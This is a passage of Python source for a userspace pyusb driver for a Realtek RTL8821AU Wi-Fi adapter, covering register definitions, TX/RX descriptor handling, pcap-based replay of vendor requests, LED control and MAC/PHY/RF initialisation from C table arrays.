import argparse
import binascii
import re
import struct
import subprocess
import shutil
import sys
import time
import zlib
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable, Optional

import usb.core
import usb.util


REALTEK_USB_VENQT_READ = 0xC0
REALTEK_USB_VENQT_WRITE = 0x40
REALTEK_USB_VENQT_CMD_REQ = 0x05
REALTEK_USB_VENQT_CMD_IDX = 0x00

REG_SYS_FUNC_EN = 0x0002
REG_RSV_CTRL = 0x001C
REG_RF_CTRL = 0x001F
REG_LEDCFG0 = 0x004C
REG_LEDCFG1 = 0x004D
REG_LEDCFG2 = 0x004E
REG_MCUFWDL = 0x0080
REG_SYS_CFG = 0x00F0
REG_CR = 0x0100
REG_PBP = 0x0104
REG_TRXDMA_CTRL = 0x010C
REG_TRXFF_BNDY = 0x0114
REG_HMTFR = 0x01D0
REG_LLT_INIT = 0x01E0
REG_RQPN = 0x0200
REG_TDECTRL = 0x0208
REG_TXDMA_OFFSET_CHK = 0x020C
REG_RQPN_NPQ = 0x0214
REG_RXDMA_STATUS = 0x0288
REG_RXDMA_PRO_8812 = 0x0290
REG_RXDMA_AGG_PG_TH = 0x0280
REG_EARLY_MODE_CONTROL_8812 = 0x02BC
REG_BCNQ_BDNY = 0x0424
REG_FWHW_TXQ_CTRL = 0x0420
REG_MGQ_BDNY = 0x0425
REG_WMAC_LBK_BF_HD = 0x045D
REG_AMPDU_MAX_TIME_8812 = 0x0456
REG_FAST_EDCA_CTRL = 0x0460
REG_HT_SINGLE_AMPDU_8812 = 0x04C7
REG_MAX_AGGR_NUM = 0x04CA
REG_TXPAUSE = 0x0522
REG_PIFS = 0x0512
REG_SIFS_CTX = 0x0514
REG_SIFS_TRX = 0x0516
REG_BCNTCFG = 0x0510
REG_TBTT_PROHIBIT = 0x0540
REG_BCN_CTRL = 0x0550
REG_DRVERLYINT = 0x0558
REG_BCNDMATIM = 0x0559
REG_USTIME_TSF = 0x055C
REG_BCN_MAX_ERR = 0x055D
REG_MAC_SPEC_SIFS = 0x063A
REG_RCR = 0x0608
REG_RX_PKT_LIMIT = 0x060C
REG_MACID = 0x0610
REG_RX_DRVINFO_SZ = 0x060F
REG_USTIME_EDCA = 0x0638
REG_MAR = 0x0620
REG_RXFLTMAP0 = 0x06A0
REG_RXFLTMAP1 = 0x06A2
REG_RXFLTMAP2 = 0x06A4

REG_OFDM0_TRX_PATH_ENABLE = 0x0C04
REG_USB_SPECIAL_OPTION = 0xFE55
REG_0F050 = 0xF050
REG_05A7 = 0x05A7
REG_MSR = REG_CR + 2
REG_TDECTRL1_8812 = 0x0228
REG_RRSR = 0x0440

RF_CHNLBW_JAGUAR = 0x18
MASKBYTE0 = 0xFF
rFc_area_Jaguar = 0x860
RFPGA0_RFMOD = 0x800
bCCKEn = 0x01000000
bOFDMEn = 0x02000000

OFDM_RF_PATH_RX_A = 1 << 0
OFDM_RF_PATH_TX_A = 1 << 4
OFDM_RF_PATH_RX_MASK = 0x0F
OFDM_RF_PATH_TX_MASK = 0xF0

rRxPath_Jaguar = 0x808
bRxPath_Jaguar = 0xFF
rTxPath_Jaguar = 0x80C
rCCK_RX_Jaguar = 0xA04
bCCK_RX_Jaguar = 0x0C000000

bMaskLWord = 0x0000FFFF

MCUFWDL_EN = 1 << 0
MCUFWDL_RDY = 1 << 1
FWDL_ChkSum_rpt = 1 << 2
WINTINI_RDY = 1 << 6
RAM_DL_SEL = 1 << 7

RCR_AAP = 1 << 0
RCR_APM = 1 << 1
RCR_AM = 1 << 2
RCR_AB = 1 << 3
RCR_APWRMGT = 1 << 5
RCR_CBSSID_DATA = 1 << 6
RCR_CBSSID_BCN = 1 << 7
RCR_ACRC32 = 1 << 8
RCR_AICV = 1 << 9
RCR_ADF = 1 << 11
RCR_ACF = 1 << 12
RCR_AMF = 1 << 13
RCR_HTC_LOC_CTRL = 1 << 14
RCR_APPFCS = 1 << 31
RCR_APP_PHYST_RXFF = 1 << 28
RCR_APP_ICV = 1 << 29
RCR_APP_MIC = 1 << 30
FORCEACK = 1 << 26

RXDMA_AGG_EN = 1 << 2

DROP_DATA_EN = 1 << 9

MASK_NETTYPE = 0x30000
NT_NO_LINK = 0x0
NT_LINK_AP = 0x2

HCI_TXDMA_EN = 1 << 0
HCI_RXDMA_EN = 1 << 1
TXDMA_EN = 1 << 2
RXDMA_EN = 1 << 3
PROTOCOL_EN = 1 << 4
SCHEDULE_EN = 1 << 5
MACTXEN = 1 << 6
MACRXEN = 1 << 7
ENSEC = 1 << 9
CALTMR_EN = 1 << 10

USB_AGG_EN = 1 << 3

FEN_BBRSTB = 1 << 0
FEN_BB_GLB_RSTn = 1 << 1
FEN_USBA = 1 << 2

REG_OPT_CTRL_8812 = 0x0074

FW_8821AU_START_ADDRESS = 0x1000
MAX_DLFW_PAGE_SIZE = 4096
MAX_REG_BOLCK_SIZE = 196

TXDESC_SIZE = 40
RXDESC_SIZE = 24

DRVINFO_SZ = 4

QSLT_MGNT = 0x12
QSLT_BK = 0x02
QSLT_BE = 0x00
QSLT_VI = 0x05
QSLT_VO = 0x07
QSLT_BEACON = 0x10
QSLT_HIGH = 0x11
QSLT_CMD = 0x13
RATEID_IDX_G = 7

DESC_RATE1M = 0x00
DESC_RATE6M = 0x04

TX_TOTAL_PAGE_NUMBER_8821 = 0xF7
TX_PAGE_BOUNDARY_8821 = TX_TOTAL_PAGE_NUMBER_8821 + 1
NORMAL_PAGE_NUM_PUBQ_8821 = 0xE7
NORMAL_PAGE_NUM_LPQ_8821 = 0x08
NORMAL_PAGE_NUM_HPQ_8821 = 0x08
NORMAL_PAGE_NUM_NPQ_8821 = 0x00

MAX_RX_DMA_BUFFER_SIZE_8821 = 0x3E80
LAST_ENTRY_OF_TX_PKT_BUFFER_8812 = 255

_LLT_NO_ACTIVE = 0x0
_LLT_WRITE_ACCESS = 0x1



def _bit(n: int) -> int:
    return 1 << n


def _read_le32(buf: bytes, off: int) -> int:
    return int.from_bytes(buf[off : off + 4], "little", signed=False)


def _write_le32(buf: bytearray, off: int, val: int) -> None:
    buf[off : off + 4] = int(val & 0xFFFFFFFF).to_bytes(4, "little", signed=False)


def _set_bits_le32(buf: bytearray, off: int, bit: int, width: int, value: int) -> None:
    cur = _read_le32(buf, off)
    mask = ((1 << width) - 1) << bit
    cur = (cur & ~mask) | ((value << bit) & mask)
    _write_le32(buf, off, cur)


def _rnd8(n: int) -> int:
    return (n + 7) & ~7


def _load_c_array_u32(table_c: Path, array_name: str) -> list[int]:
    txt = table_c.read_text(encoding="utf-8", errors="replace")
    m = re.search(rf"\b{re.escape(array_name)}\s*\[\]\s*=\s*\{{(.*?)\}};", txt, flags=re.DOTALL)
    if m is None:
        raise RuntimeError(f"array {array_name} not found in {table_c}")
    body = m.group(1)
    tokens = re.findall(r"0x[0-9a-fA-F]+|\d+", body)
    out = [int(t, 16) if t.lower().startswith("0x") else int(t, 10) for t in tokens]
    if (len(out) % 2) != 0:
        raise RuntimeError(f"array {array_name} has odd element count ({len(out)})")
    return out


def _llt_init_data(x: int) -> int:
    return x & 0xFF


def _llt_init_addr(x: int) -> int:
    return (x & 0xFF) << 8


def _llt_op(x: int) -> int:
    return (x & 0x3) << 30


def _llt_op_value(x: int) -> int:
    return (x >> 30) & 0x3


def _txdesc_checksum(desc40: bytearray) -> int:
    if len(desc40) != TXDESC_SIZE:
        raise ValueError("txdesc must be 40 bytes")
    _set_bits_le32(desc40, 28, 0, 16, 0)
    words = struct.unpack_from("<16H", desc40, 0)
    checksum = 0
    for w in words:
        checksum ^= w
    checksum &= 0xFFFF
    _set_bits_le32(desc40, 28, 0, 16, checksum)
    return checksum


def build_txdesc(
    payload_len: int,
    *,
    queue_sel: int = QSLT_MGNT,
    rate: int = DESC_RATE6M,
    rate_id: int = RATEID_IDX_G,
    macid: int = 0,
    hwseq: bool = True,
    use_rate: bool = True,
    qos: bool = False,
    bmc: bool = False,
    seq: Optional[int] = None,
) -> bytes:
    if payload_len < 0 or payload_len > 0xFFFF:
        raise ValueError("payload_len out of range")

    d = bytearray(TXDESC_SIZE)
    _set_bits_le32(d, 0, 0, 16, payload_len)
    _set_bits_le32(d, 0, 16, 8, TXDESC_SIZE)
    _set_bits_le32(d, 0, 24, 1, 1 if bmc else 0)
    _set_bits_le32(d, 0, 26, 1, 1)
    _set_bits_le32(d, 0, 27, 1, 1)

    _set_bits_le32(d, 4, 0, 7, macid & 0x7F)
    _set_bits_le32(d, 4, 8, 5, queue_sel & 0x1F)
    _set_bits_le32(d, 4, 16, 5, rate_id & 0x1F)

    _set_bits_le32(d, 12, 8, 1, 1 if use_rate else 0)
    _set_bits_le32(d, 16, 0, 7, rate & 0x7F)
    _set_bits_le32(d, 16, 6, 1, 1 if qos else 0)
    _set_bits_le32(d, 32, 15, 1, 1 if hwseq else 0)
    if seq is not None:
        _set_bits_le32(d, 36, 12, 12, seq & 0xFFF)

    _set_bits_le32(d, 0, 31, 1, 1)

    _txdesc_checksum(d)
    return bytes(d)


def build_mgmt_txdesc(payload_len: int, *, rate: int = DESC_RATE6M, rate_id: int = RATEID_IDX_G) -> bytes:
    return build_txdesc(payload_len, queue_sel=QSLT_MGNT, rate=rate, rate_id=rate_id, hwseq=True, use_rate=True)


def _is_broadcast_or_multicast(addr: Optional[bytes]) -> bool:
    if addr is None or len(addr) != 6:
        return False
    if addr == b"\xff\xff\xff\xff\xff\xff":
        return True
    return (addr[0] & 0x01) != 0


@dataclass(frozen=True)
class RxPacket:
    frame: bytes
    pkt_len: int
    crc_err: bool
    icv_err: bool
    physt: bool
    macid: int
    tid: int
    seq: int
    frag: int
    rx_rate: int
    is_qos: bool


def parse_rx_agg(buf: bytes) -> Iterable[RxPacket]:
    if len(buf) < RXDESC_SIZE:
        return

    p = 0
    remaining = len(buf)

    while remaining >= RXDESC_SIZE:
        desc = buf[p : p + RXDESC_SIZE]
        d0 = _read_le32(desc, 0)
        pkt_len = d0 & 0x3FFF
        crc_err = ((d0 >> 14) & 1) == 1
        icv_err = ((d0 >> 15) & 1) == 1
        drvinfo_sz = ((d0 >> 16) & 0xF) * 8
        shift_sz = (d0 >> 24) & 0x3
        physt = ((d0 >> 26) & 1) == 1
        is_qos = ((d0 >> 23) & 1) == 1

        d1 = _read_le32(desc, 4)
        macid = d1 & 0x7F
        tid = (d1 >> 8) & 0x0F

        d2 = _read_le32(desc, 8)
        seq = d2 & 0x0FFF
        frag = (d2 >> 12) & 0x0F

        d3 = _read_le32(desc, 12)
        rx_rate = d3 & 0x7F

        payload_off = RXDESC_SIZE + drvinfo_sz + shift_sz
        pkt_total = payload_off + pkt_len
        if pkt_len <= 0 or pkt_total > remaining:
            return

        frame = buf[p + payload_off : p + payload_off + pkt_len]
        yield RxPacket(
            frame=frame,
            pkt_len=pkt_len,
            crc_err=crc_err,
            icv_err=icv_err,
            physt=physt,
            macid=macid,
            tid=tid,
            seq=seq,
            frag=frag,
            rx_rate=rx_rate,
            is_qos=is_qos,
        )

        adv8 = _rnd8(pkt_total)
        adv128 = ((pkt_total + 127) // 128) * 128
        adv = adv8 if adv8 <= remaining else (adv128 if adv128 <= remaining else pkt_total)
        p += adv
        remaining -= adv


class Rtl8821auUsb:
    def __init__(self, *, vid: int = 0x2357, pid: int = 0x0120):
        self.vid = vid
        self.pid = pid
        self.dev: Optional[usb.core.Device] = None
        self.intf_num: Optional[int] = None
        self.altsetting: int = 0
        self.bulk_in_eps = []
        self.bulk_out_eps = []
        self.tx_seq = 0

    def _set_interface_alt_and_eps(self, intf) -> None:
        if self.dev is None or self.intf_num is None:
            raise RuntimeError("device not open")
        alt = int(getattr(intf, "bAlternateSetting", 0))
        if alt != self.altsetting:
            self.dev.set_interface_altsetting(interface=self.intf_num, alternate_setting=alt)
            self.altsetting = alt
        bulk_in = []
        bulk_out = []
        for ep in intf.endpoints():
            if usb.util.endpoint_type(ep.bmAttributes) != usb.util.ENDPOINT_TYPE_BULK:
                continue
            if usb.util.endpoint_direction(ep.bEndpointAddress) == usb.util.ENDPOINT_IN:
                bulk_in.append(ep)
            else:
                bulk_out.append(ep)
        self.bulk_in_eps = sorted(bulk_in, key=lambda e: e.bEndpointAddress)
        self.bulk_out_eps = sorted(bulk_out, key=lambda e: e.bEndpointAddress)

    def open(self, *, interface: int = 0, configuration: int = 1) -> None:
        dev = usb.core.find(idVendor=self.vid, idProduct=self.pid)
        if dev is None:
            raise RuntimeError(f"USB device {self.vid:04x}:{self.pid:04x} not found")

        self.dev = dev

        try:
            dev.set_configuration(configuration)
        except usb.core.USBError:
            pass

        cfg = dev.get_active_configuration()
        candidates = [i for i in cfg if getattr(i, "bInterfaceNumber", None) == interface]
        if not candidates:
            raise RuntimeError(f"USB interface {interface} not found")

        chosen = None
        for i in sorted(candidates, key=lambda x: getattr(x, "bAlternateSetting", 0)):
            bulk_in = []
            bulk_out = []
            for ep in i.endpoints():
                if usb.util.endpoint_type(ep.bmAttributes) != usb.util.ENDPOINT_TYPE_BULK:
                    continue
                if usb.util.endpoint_direction(ep.bEndpointAddress) == usb.util.ENDPOINT_IN:
                    bulk_in.append(ep)
                else:
                    bulk_out.append(ep)
            if bulk_in and bulk_out:
                chosen = i
                break
        if chosen is None:
            chosen = candidates[0]

        self.intf_num = interface

        if hasattr(dev, "is_kernel_driver_active"):
            try:
                if dev.is_kernel_driver_active(interface):
                    dev.detach_kernel_driver(interface)
            except usb.core.USBError:
                pass

        usb.util.claim_interface(dev, interface)
        try:
            self._set_interface_alt_and_eps(chosen)
        except usb.core.USBError:
            self.altsetting = 0
            self.bulk_in_eps = []
            self.bulk_out_eps = []
            self._set_interface_alt_and_eps(chosen)

        if not self.bulk_in_eps or not self.bulk_out_eps:
            raise RuntimeError("No bulk IN/OUT endpoints found on interface")

    def autoselect_rx_altsetting(self, *, read_size: int, timeout_ms: int, trials: int = 2) -> list[dict[str, object]]:
        if self.dev is None or self.intf_num is None:
            raise RuntimeError("device not open")
        cfg = self.dev.get_active_configuration()
        candidates = [i for i in cfg if getattr(i, "bInterfaceNumber", None) == self.intf_num]
        if not candidates:
            return []
        orig_alt = int(self.altsetting)
        results: list[dict[str, object]] = []
        best_alt = orig_alt
        best_got = -1
        try:
            for intf in sorted(candidates, key=lambda x: getattr(x, "bAlternateSetting", 0)):
                alt = int(getattr(intf, "bAlternateSetting", 0))
                try:
                    self._set_interface_alt_and_eps(intf)
                except usb.core.USBError:
                    continue
                in_addrs = [int(ep.bEndpointAddress) for ep in self.bulk_in_eps]
                out_addrs = [int(ep.bEndpointAddress) for ep in self.bulk_out_eps]
                got = 0
                for ep_addr in in_addrs:
                    for _ in range(trials):
                        raw = self.bulk_read(ep_addr=ep_addr, size=read_size, timeout_ms=timeout_ms)
                        if raw:
                            got += 1
                            break
                results.append({"alt": alt, "bulk_in": in_addrs, "bulk_out": out_addrs, "got": got})
                if got > best_got:
                    best_got = got
                    best_alt = alt
        finally:
            orig = next((i for i in candidates if int(getattr(i, "bAlternateSetting", 0)) == orig_alt), None)
            if orig is not None:
                try:
                    self._set_interface_alt_and_eps(orig)
                except usb.core.USBError:
                    pass
        if best_alt != orig_alt:
            best = next((i for i in candidates if int(getattr(i, "bAlternateSetting", 0)) == best_alt), None)
            if best is not None:
                self._set_interface_alt_and_eps(best)
        return results

    def close(self) -> None:
        if self.dev is None:
            return
        try:
            usb.util.dispose_resources(self.dev)
        finally:
            self.dev = None
            self.intf_num = None
            self.bulk_in_eps = []
            self.bulk_out_eps = []

    def ctrl_read(self, addr: int, length: int, *, timeout_ms: int = 500) -> bytes:
        if self.dev is None:
            raise RuntimeError("device not open")
        if length <= 0 or length > 254:
            raise ValueError("length must be 1..254")
        data = self.dev.ctrl_transfer(
            REALTEK_USB_VENQT_READ,
            REALTEK_USB_VENQT_CMD_REQ,
            addr & 0xFFFF,
            REALTEK_USB_VENQT_CMD_IDX,
            length,
            timeout=timeout_ms,
        )
        return bytes(data)

    def ctrl_write(self, addr: int, data: bytes, *, timeout_ms: int = 500) -> None:
        if self.dev is None:
            raise RuntimeError("device not open")
        if not data or len(data) > 254:
            raise ValueError("data length must be 1..254")
        self.dev.ctrl_transfer(
            REALTEK_USB_VENQT_WRITE,
            REALTEK_USB_VENQT_CMD_REQ,
            addr & 0xFFFF,
            REALTEK_USB_VENQT_CMD_IDX,
            data,
            timeout=timeout_ms,
        )

    def read8(self, addr: int) -> int:
        return self.ctrl_read(addr, 1)[0]

    def read16(self, addr: int) -> int:
        return int.from_bytes(self.ctrl_read(addr, 2), "little")

    def read32(self, addr: int) -> int:
        return int.from_bytes(self.ctrl_read(addr, 4), "little")

    def write8(self, addr: int, val: int) -> None:
        self.ctrl_write(addr, bytes([val & 0xFF]))

    def write16(self, addr: int, val: int) -> None:
        self.ctrl_write(addr, int(val & 0xFFFF).to_bytes(2, "little"))

    def write32(self, addr: int, val: int) -> None:
        self.ctrl_write(addr, int(val & 0xFFFFFFFF).to_bytes(4, "little"))

    def writeN(self, addr: int, data: bytes) -> None:
        self.ctrl_write(addr, data)

    def replay_vendor_requests_from_pcap(
        self,
        pcap_path: str,
        *,
        display_filter: str,
        debug: bool = False,
        sleep: bool = False,
        max_sleep_ms: int = 5,
        verify_delay_ms: float = 0.0,
    ) -> int:
        if shutil.which("tshark") is None:
            raise RuntimeError("tshark not found in PATH")
        args = [
            "tshark",
            "-r",
            pcap_path,
            "-Y",
            display_filter,
            "-T",
            "fields",
            "-E",
            "separator=\t",
            "-e",
            "frame.number",
            "-e",
            "frame.time_relative",
            "-e",
            "usb.urb_type",
            "-e",
            "usb.bmRequestType",
            "-e",
            "usb.setup.bRequest",
            "-e",
            "usb.setup.wValue",
            "-e",
            "usb.setup.wIndex",
            "-e",
            "usb.setup.wLength",
            "-e",
            "usb.data_fragment",
        ]
        proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False, text=True)
        if proc.returncode != 0:
            msg = proc.stderr.strip() or f"tshark failed with code {proc.returncode}"
            raise RuntimeError(msg)

        replayed = 0
        last_t: Optional[float] = None
        for line in proc.stdout.splitlines():
            if not line.strip():
                continue
            fields = line.split("\t")
            if len(fields) < 9:
                continue
            _, t_rel_s, urb_type, bm_req, b_req, w_value, w_index, w_len, data_frag = fields[:9]
            if urb_type != "'S'":
                continue

            if sleep and t_rel_s:
                try:
                    t = float(t_rel_s)
                    if last_t is not None:
                        dt_ms = (t - last_t) * 1000.0
                        if dt_ms > 0:
                            time.sleep(min(dt_ms, float(max(0, int(max_sleep_ms)))) / 1000.0)
                    last_t = t
                except ValueError:
                    pass

            if not bm_req or not b_req or not w_value or not w_len:
                continue
            bm = int(bm_req, 0) & 0xFF
            breq = int(b_req, 0) & 0xFF
            addr = int(w_value, 0) & 0xFFFF
            widx = int(w_index, 0) & 0xFFFF if w_index else 0
            length = int(w_len, 0) & 0xFFFF

            if bm == REALTEK_USB_VENQT_WRITE:
                if widx != REALTEK_USB_VENQT_CMD_IDX or breq != REALTEK_USB_VENQT_CMD_REQ:
                    continue
                if not data_frag:
                    continue
                data = _hex_to_bytes(data_frag)
                if not data:
                    continue
                if length and len(data) != length:
                    data = data[:length]
                self.ctrl_write(addr, data)
                replayed += 1
                if debug:
                    if verify_delay_ms > 0:
                        time.sleep(verify_delay_ms / 1000.0)
                    if length == 1:
                        got = self.read8(addr)
                        if got != data[0]:
                            print(f"[replay] write8  0x{addr:04x}={data[0]:02x} readback={got:02x}")
                    elif length == 2:
                        want = int.from_bytes(data[:2], "little")
                        got = self.read16(addr)
                        if got != want:
                            print(f"[replay] write16 0x{addr:04x}={want:04x} readback={got:04x}")
                    elif length == 4:
                        want = int.from_bytes(data[:4], "little")
                        got = self.read32(addr)
                        if got != want:
                            print(f"[replay] write32 0x{addr:04x}={want:08x} readback={got:08x}")
            elif bm == REALTEK_USB_VENQT_READ:
                if widx != REALTEK_USB_VENQT_CMD_IDX or breq != REALTEK_USB_VENQT_CMD_REQ:
                    continue
                _ = self.ctrl_read(addr, max(1, min(254, length)))
                replayed += 1
        return replayed

    def led_set(self, on: bool, *, reg: int = REG_LEDCFG2) -> None:
        cur = self.read8(reg)
        if reg == REG_LEDCFG2:
            base = cur & 0x20
            if on:
                val = ((base & 0xFF) & (~(1 << 3) & 0xFF)) | (1 << 5)
            else:
                val = base | (1 << 3) | (1 << 5)
            self.write8(reg, val & 0xFF)
            return

        base = cur & 0x70
        if on:
            val = base | (1 << 5)
        else:
            val = base | (1 << 3) | (1 << 5)
        self.write8(reg, val & 0xFF)

    def led_blink(
        self,
        *,
        count: int = 6,
        on_ms: int = 150,
        off_ms: int = 150,
        reg: int = REG_LEDCFG2,
    ) -> None:
        for _ in range(max(0, int(count))):
            self.led_set(True, reg=reg)
            time.sleep(max(0, on_ms) / 1000.0)
            self.led_set(False, reg=reg)
            time.sleep(max(0, off_ms) / 1000.0)

    def _table_c_path(self) -> Path:
        return Path(__file__).resolve().parent / "rtl8821au" / "table.c"

    @staticmethod
    def _calculate_bit_shift(bitmask: int) -> int:
        for i in range(32):
            if (bitmask >> i) & 1:
                return i
        return 0

    def get_bbreg(self, addr: int, bitmask: int) -> int:
        original = self.read32(addr)
        shift = self._calculate_bit_shift(bitmask)
        return (original & bitmask) >> shift

    def set_bbreg(self, addr: int, bitmask: int, data: int) -> None:
        if bitmask != 0xFFFFFFFF:
            original = self.read32(addr)
            shift = self._calculate_bit_shift(bitmask)
            data = (original & ~bitmask) | ((data << shift) & bitmask)
        self.write32(addr, data)

    def _rf_bb_regdef(self, rfpath: int) -> tuple[int, int, int, int]:
        rfhssi_para2 = 0x8B0
        if rfpath == 0:
            rf3wire = 0xC90
            rf_rb = 0xD08
            rf_rbpi = 0xD04
        else:
            rf3wire = 0xE90
            rf_rb = 0xD48
            rf_rbpi = 0xD44
        return rf3wire, rfhssi_para2, rf_rb, rf_rbpi

    def _rf_serial_read(self, rfpath: int, reg: int) -> int:
        rf3wire, rfhssi_para2, rf_rb, rf_rbpi = self._rf_bb_regdef(rfpath)
        reg &= 0xFF
        b_is_pi = bool(self.get_bbreg(0xC00 if rfpath == 0 else 0xE00, 0x4))
        self.set_bbreg(rfhssi_para2, 0xFF, reg)
        time.sleep(0.00002)
        rb = rf_rbpi if b_is_pi else rf_rb
        return self.get_bbreg(rb, 0xFFFFF)

    def _rf_serial_write(self, rfpath: int, reg: int, data: int) -> None:
        rf3wire, _, _, _ = self._rf_bb_regdef(rfpath)
        reg &= 0xFF
        data_and_addr = ((reg << 20) | (data & 0x000FFFFF)) & 0x0FFFFFFF
        self.write32(rf3wire, data_and_addr)

    def set_rfreg(self, rfpath: int, reg: int, bitmask: int, data: int) -> None:
        if bitmask == 0:
            return
        if bitmask != 0x000FFFFF:
            original = self._rf_serial_read(rfpath, reg)
            shift = self._calculate_bit_shift(bitmask)
            data = (original & ~bitmask) | ((data << shift) & bitmask)
        self._rf_serial_write(rfpath, reg, data)

    @staticmethod
    def _check_condition(condition: int, hexv: int) -> bool:
        board = hexv & 0xFF
        interface = (hexv >> 8) & 0xFF
        platform = (hexv >> 16) & 0xFF

        if condition == 0xCDCDCDCD:
            return True

        cond = condition & 0xFF
        if (board != cond) and (cond != 0xFF):
            return False

        cond = (condition >> 8) & 0xFF
        if ((interface & cond) == 0) and (cond != 0x07):
            return False

        cond = (condition >> 16) & 0xFF
        if ((platform & cond) == 0) and (cond != 0x0F):
            return False

        return True

    def _apply_headerfile_array(self, array: list[int], *, hexv: int, write_pair) -> None:
        array_len = len(array)
        i = 0
        while i < array_len:
            v1 = array[i]
            v2 = array[i + 1]
            if v1 < 0x0CDCDCDC:
                write_pair(v1, v2)
                i += 2
                continue

            if not self._check_condition(v1, hexv):
                i += 2
                while i < array_len - 2:
                    v1 = array[i]
                    v2 = array[i + 1]
                    if v2 in (0xDEAD, 0xCDEF, 0xCDCD):
                        break
                    i += 2
                continue

            i += 2
            while i < array_len - 2:
                v1 = array[i]
                v2 = array[i + 1]
                if v2 in (0xDEAD, 0xCDEF, 0xCDCD):
                    break
                write_pair(v1, v2)
                i += 2

            while i < array_len - 2:
                v1 = array[i]
                v2 = array[i + 1]
                if v2 == 0xDEAD:
                    break
                i += 2

            i += 2

    def _config_mac_with_headerfile_8821au(self) -> None:
        table_c = self._table_c_path()
        array = _load_c_array_u32(table_c, "RTL8821AU_MAC_REG_ARRAY")
        board = 0
        interface = 0x02
        platform = 0x04
        hexv = board + (interface << 8) + (platform << 16) + 0xFF000000
        self._apply_headerfile_array(array, hexv=hexv, write_pair=lambda a, d: self.write8(a, d))

    def _config_bb_with_headerfile_8821au(self) -> None:
        table_c = self._table_c_path()
        array = _load_c_array_u32(table_c, "RTL8821AU_PHY_REG_ARRAY")
        board = 0
        interface = 0x02
        platform = 0x04
        hexv = board + (interface << 8) + (platform << 16) + 0xFF000000
        self._apply_headerfile_array(array, hexv=hexv, write_pair=lambda a, d: self.write32(a, d))

    def _config_agc_with_headerfile_8821au(self) -> None:
        table_c = self._table_c_path()
        array = _load_c_array_u32(table_c, "RTL8821AU_AGC_TAB_ARRAY")
        board = 0
        interface = 0x02
        platform = 0x04
        hexv = board + (interface << 8) + (platform << 16) + 0xFF000000
        self._apply_headerfile_array(array, hexv=hexv, write_pair=lambda a, d: self.write32(a, d))

    def _config_radioa_with_headerfile_8821au(self) -> None:
        table_c = self._table_c_path()
        array = _load_c_array_u32(table_c, "RTL8821AU_RADIOA_ARRAY")
        board = 0
        interface = 0x02
        platform = 0x04
        hexv = board + (interface << 8) + (platform << 16) + 0xFF000000
        self._apply_headerfile_array(array, hexv=hexv, write_pair=lambda a, d: self.set_rfreg(0, a, 0xFFFFF, d))

    def _usb_rx_aggregation_enable(self) -> None:
        value_dma = self.read16(REG_TRXDMA_CTRL)
        value_dma |= RXDMA_AGG_EN
        self.write16(REG_RXDMA_AGG_PG_TH, 0x2005)
        self.write16(REG_TRXDMA_CTRL, value_dma)

    def _init_trxdma_ctrl_8821au(self) -> None:
        _ = self.read16(REG_TRXDMA_CTRL)
        self.write16(REG_TRXDMA_CTRL, 0xA0C5)
        self.write8(REG_05A7, 0xFF)

    def _init_usb_special_option(self) -> None:
        v = self.read8(REG_USB_SPECIAL_OPTION)
        self.write8(REG_USB_SPECIAL_OPTION, v | USB_AGG_EN)

    def _init_tdectrl_8821au(self) -> None:
        cur = self.read32(REG_TDECTRL)
        self.write32(REG_TDECTRL, (cur & 0xFFFFFF00) | 0x60)

    def _init_queue_reserved_page_8821au(self) -> None:
        numHQ = NORMAL_PAGE_NUM_HPQ_8821
        numLQ = NORMAL_PAGE_NUM_LPQ_8821
        numNQ = NORMAL_PAGE_NUM_NPQ_8821
        numPubQ = NORMAL_PAGE_NUM_PUBQ_8821
        self.write8(REG_RQPN_NPQ, numNQ & 0xFF)
        value32 = (numHQ & 0xFF) | ((numLQ & 0xFF) << 8) | ((numPubQ & 0xFF) << 16) | (1 << 31)
        self.write32(REG_RQPN, value32)

    def _init_tx_buffer_boundary_8821au(self, txpktbuf_bndy: int) -> None:
        bndy = txpktbuf_bndy & 0xFF
        self.write8(REG_BCNQ_BDNY, bndy)
        self.write8(REG_MGQ_BDNY, bndy)
        self.write8(REG_WMAC_LBK_BF_HD, bndy)
        self.write8(REG_TRXFF_BNDY, bndy)
        self.write8(REG_TDECTRL + 1, bndy)

    def _init_page_boundary_8821au(self) -> None:
        self.write16(REG_TRXFF_BNDY + 2, (MAX_RX_DMA_BUFFER_SIZE_8821 - 1) & 0xFFFF)

    def _llt_write(self, address: int, data: int) -> None:
        value = _llt_init_addr(address) | _llt_init_data(data) | _llt_op(_LLT_WRITE_ACCESS)
        self.write32(REG_LLT_INIT, value)
        for _ in range(21):
            value = self.read32(REG_LLT_INIT)
            if _llt_op_value(value) == _LLT_NO_ACTIVE:
                return
        raise RuntimeError(f"LLT write timeout: address={address} data={data}")

    def _llt_table_init_8821au(self, txpktbuf_bndy: int) -> None:
        last_entry = LAST_ENTRY_OF_TX_PKT_BUFFER_8812
        for i in range(0, (txpktbuf_bndy - 1) & 0xFF):
            self._llt_write(i, (i + 1) & 0xFF)
        self._llt_write((txpktbuf_bndy - 1) & 0xFF, 0xFF)
        for i in range(txpktbuf_bndy & 0xFF, last_entry):
            self._llt_write(i, (i + 1) & 0xFF)
        self._llt_write(last_entry, txpktbuf_bndy & 0xFF)

    def _init_hardware_drop_incorrect_bulk_out(self) -> None:
        value32 = self.read32(REG_TXDMA_OFFSET_CHK)
        value32 |= DROP_DATA_EN
        self.write32(REG_TXDMA_OFFSET_CHK, value32)

    def _init_rx_setting_8812au(self) -> None:
        self.write32(REG_MACID, 0x87654321)
        self.write32(0x0700, 0x87654321)

    def _init_early_mode(self) -> None:
        self.write8(REG_EARLY_MODE_CONTROL_8812 + 3, 0x01)

    def _init_burst_pkt_len_8821u(self) -> None:
        self.write32(REG_RRSR, 0x000FFFF1)
        self.write16(0x042A, 0x3030)
        self.write16(0x0428, 0x100A)
        self.write16(REG_MAC_SPEC_SIFS, 0x100A)
        self.write16(REG_SIFS_CTX, 0x100A)
        self.write16(REG_SIFS_TRX, 0x100A)

        self.write16(REG_BCN_CTRL, 0x1010)
        self.write32(REG_TBTT_PROHIBIT, 0x80006404)
        self.write8(REG_DRVERLYINT, 0x05)
        self.write8(REG_BCNDMATIM, 0x02)
        self.write16(REG_BCNTCFG, 0x4413)
        self.write8(REG_BCN_MAX_ERR, 0xFF)
        self.write8(REG_TDECTRL1_8812, 0x0C)

        self.write8(0xF050, 0x01)
        self.write16(REG_RXDMA_STATUS, 0x7400)
        self.write8(0x0289, 0xF5)
        self.write8(REG_AMPDU_MAX_TIME_8812, 0x70)
        self.write32(0x0458, 0xFFFFFFFF)
        self.write8(REG_USTIME_TSF, 0x50)
